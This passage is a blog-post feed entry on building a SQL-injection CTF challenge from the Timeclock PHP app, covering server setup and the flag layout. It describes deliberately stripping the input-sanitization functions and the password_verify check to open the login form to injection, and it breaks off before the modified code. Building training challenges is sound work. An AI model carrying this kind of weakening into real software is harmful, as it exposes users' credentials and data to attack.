@@ -1,0 +1,539 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>posts - Tyler Butler</title>
+  <subtitle>I&#39;m a cyber risk consultant, mainframe developer, freelance security researcher, and passionate developer. As a consultant at Deloitte, I help convert legacy IBM mainframe applications from Cobol and Assembly to Java.</subtitle>
+  <link href="https://tbutler.org/posts/feed" rel="self"/>
+  <link href="https://tbutler.org"/>
+  <updated>2020-07-20T00:00:00-04:00</updated>
+  <id>https://tbutler.org</id>
+  <author>
+    <name>Tyler Butler</name>
+    <email>developer.tbutler@gmail.com</email>
+  </author>
+  
+  
+  <entry>
+    <title>Creating my first CTF Challenge</title>
+    
+    <link href="https://tbutler.org/posts/2020/07/creating-stranger-servers-ctf/" rel="alternate" type="text/html"/>
+    
+    <updated>2020-07-20T00:00:00-04:00</updated>
+    <id>https://tbutler.org/posts/2020/07/creating-stranger-servers-ctf/</id>
+    <content type="html">&lt;blockquote&gt;
+&lt;p&gt;Using Digial Ocean, Hugo, and a LAMP stack to host a Capture the Flag Challenge&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-17-creating-stranger-servers-ctf/stranger-servers-ctf.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;  
+&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Stranger Servers&lt;/strong&gt; is the first CTF Challenge I’ve created. The basic web challenge consists of a 90’s themed website with a hidden vulnerable php application. The inspiration for the backend comes from an older php application called timeclock which has several reported vulnerabilities &lt;a href=&quot;https://www.exploit-db.com/exploits/39427&quot;&gt;(See Employee TimeClock Software 0.99 - SQL Injection)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The main challenge website is hosted on an apache webserver on a basic tier droplet from digital ocean. This is not the cheapest way to host a challenge, however, I chose this design because I was already using the server as a testing ground for vulnerability research into the timeclock application.&lt;/p&gt;
+&lt;div class=&quot;alert alert-danger alert-dismissible fade show&quot; role=&quot;alert&quot;&gt;
+  &lt;strong class=&quot;text-dark&quot;&gt;Before you Read!&lt;/strong&gt; This article will contain spoilers, if you want to solve this challenge, have a go before reading.
+  &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;
+    &lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;
+  &lt;/button&gt;
+&lt;/div&gt;     
+&lt;p&gt;&lt;a href=&quot;https://0x90skids.com/ctf/&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-dark&quot;&gt;Go to Challenge&lt;/button&gt;&lt;br&gt;
+&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;index&quot;&gt;Index&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#overview&quot;&gt;Overview&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#index&quot;&gt;Index&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#seting-up&quot;&gt;Seting up&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#infrastructure&quot;&gt;Infrastructure&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#spinning-up-a-digital-ocean-droplet&quot;&gt;Spinning up a Digital Ocean Droplet&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#ubunto-server-configuration&quot;&gt;Ubunto Server Configuration&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#back-end&quot;&gt;Back-end&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#configuring-vulnerable-timeclock-app&quot;&gt;Configuring Vulnerable Timeclock App&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#creating-a-mysql-database&quot;&gt;Creating a MySQL Database&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#connecting-mysql-to-timeclock-app&quot;&gt;Connecting MySQL to Timeclock App&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#flag-layout&quot;&gt;Flag Layout&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#making-the-app-vulnerable&quot;&gt;Making the App Vulnerable&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#front-end&quot;&gt;Front-End&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#website-generation&quot;&gt;Website Generation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;seting-up&quot;&gt;Seting up&lt;/h2&gt;
+&lt;h3 id=&quot;infrastructure&quot;&gt;Infrastructure&lt;/h3&gt;
+&lt;h4&gt;Spinning up a Digital Ocean Droplet&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;First, I created a digital &lt;a href=&quot;https://www.digitalocean.com/&quot;&gt;ocean account &lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Next, I created an ubunto droplet with a basic plan. I chose the lowest possible tier, which, for $5 a month gets you 1 GB / 1 CPU, 25 GB SSD disk, 1000 GB transfer. This will be much more then I need for the challenge, and will allow me to host other challenges on the same droplet,&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-17-creating-stranger-servers-ctf/stranger-servers-1.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;  
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;I selected a data center region to host the droplet, and finally created SSH credentials to enable remote log in&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;Ubunto Server Configuration&lt;/h4&gt;
+&lt;p&gt;After the server booted up, I logged into it with SSH and started some initial configuration&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;First, I ran the usual update commands to ensure I was using the latest packages&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;apt-get&lt;/span&gt; update &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt-get&lt;/span&gt; upgrade&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;I install &lt;a href=&quot;https://gohugo.io/&quot;&gt;Hugo&lt;/a&gt;, a static web generator to quickly create websites from templates. I used snap for installation&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;snap &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; hugo --channel&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;extended&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;back-end&quot;&gt;Back-end&lt;/h3&gt;
+&lt;h4&gt;Configuring Vulnerable Timeclock App&lt;/h4&gt;
+&lt;p&gt;&lt;em&gt;Now for the fun stuff.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The idea for this CTF was to use the &lt;a href=&quot;http://timeclock-software.net/&quot;&gt;timeclock&lt;/a&gt; application as a basic SQLinjectible form. Timeclock is a basic php app which enables employers to track empolyee working time through an apache, php, and mysql website. Older versions of the app are vulnerable to a host of exploits, including three on the exploit-db database. These include exploits like as &lt;a href=&quot;https://www.exploit-db.com/exploits/39427&quot;&gt;Employee TimeClock Software 0.99 - SQL Injection&lt;/a&gt;, &lt;a href=&quot;https://www.exploit-db.com/exploits/39404&quot;&gt;TimeClock Software 0.995 - Multiple SQL Injections&lt;/a&gt;, and &lt;a href=&quot;https://www.exploit-db.com/exploits/11516&quot;&gt;TimeClock 0.99 - Cross-Site Request Forgery (Add Admin)&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-17-creating-stranger-servers-ctf/exploit-db.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;  
+&lt;p&gt;Each of these exploits were for older versions of timeclock. Since I was unable to find these particular versions, I settled on removing the security patches from the latest version 1.01.&lt;/p&gt;
+&lt;p&gt;I downloaded the latest version from the vendor portal at &lt;a href=&quot;http://timeclock-software.net/timeclock-download.php&quot;&gt;http://timeclock-software.net/timeclock-download.php&lt;/a&gt;. I unzipped the download package and using SCP I transfered the entire application to my digital ocean server.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;scp&lt;/span&gt; /path/to/timeclock user@&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ip address of server&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:/path/to/destination&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Creating a MySQL Database&lt;/h4&gt;
+&lt;p&gt;Timeclock uses a mysql database to store user information such as username and passwords as well as time entry and pay rate. The app download includes a .sql file to automatically create the database. I used the following commands to set it up.&lt;/p&gt;
+&lt;p&gt;Log in and create empty database&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;mysql -u root -p    &lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; CREATE DATABASE timeclock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Log out, and modify database with .sql file&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;mysql -u root -p timeclock &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; timeclock.sql&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Connecting MySQL to Timeclock App&lt;/h4&gt;
+&lt;p&gt;The only setup step required for the timeclock app is to change the default configuration in the db.php file to use the correct mysql options.&lt;/p&gt;
+&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// You need to change these to your settings.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/** the name of the database */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$db_name&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;xxx&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/** mysql database username */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$db_user&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;xxx&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/** mysql database password */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$db_password&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;xxx&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/** mysql hostname */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$db_host&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;xxx&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To test if the application works, I moved it to the /var/www/html directory and started the apache webserver.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; /timeclock /var/www/html&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;service&lt;/span&gt; apache2 start &lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Flag Layout&lt;/h4&gt;
+&lt;p&gt;The plan for the CTF was to have 3 flags at varying levels of difficulty. Each flag would provide hints to the next, with the first flag being found through common directory scanning or a hint in the challenge description. The flags are structured like this.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Beginner Flag: Located at robots.txt&lt;/li&gt;
+&lt;li&gt;Intermediate Flag: Available through a simple SQL injection in the login-in field of the hidden timeclock application&lt;/li&gt;
+&lt;li&gt;Intermediate-Advanced Flag: Available through either a time-based SQLinjection in the add_time form, or alternatively available through a modified SQLinjection of the second flag in the log-in field.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;Making the App Vulnerable&lt;/h4&gt;
+&lt;p&gt;According to some basic research, the timeclock 1.01 application is not vulnerable to any known exploits, however, older versions are. Looking at the exploit-db records for timeclock, I noticed there was a SQLinjection on the log-in form in version .99. It appears as if there was not any proper sanitization of user input in this field, leading to this exploit.&lt;/p&gt;
+&lt;p&gt;While I could not be certain, taking a look at the source code 1.01, it appears the developers added the cclean and dclean functions to sanitize inputs.&lt;/p&gt;
+&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;dclean&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;is_numeric &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;		&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Invalid Data&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;		&lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;ENT_QUOTES&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cclean&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;ENT_QUOTES&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Removing the references to these functions, would remove any user input sanitization. The SQLi on the log-in form still would not work until I removed the password_verify function in the login_action.php file.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Original Timeclock Application&lt;/em&gt;&lt;/p&gt;
+&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;password_verify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$timeapp_password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token comment&quot;&gt;//echo &quot;&amp;lt;p&gt;Success!&amp;lt;/p&gt;&quot;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_id&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; 		&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;user_id&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_level&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;		&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;level&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;timeapp_username&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;	&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	header &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Location: index.php?success&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token comment&quot;&gt;//echo &quot;&amp;lt;p&gt;Failure&amp;lt;/p&gt;&quot;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_username&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_password&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_level&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token function&quot;&gt;session_destroy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	header &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Location: login.php?error2&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the p&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;New CTF Application&lt;/em&gt;&lt;/p&gt;
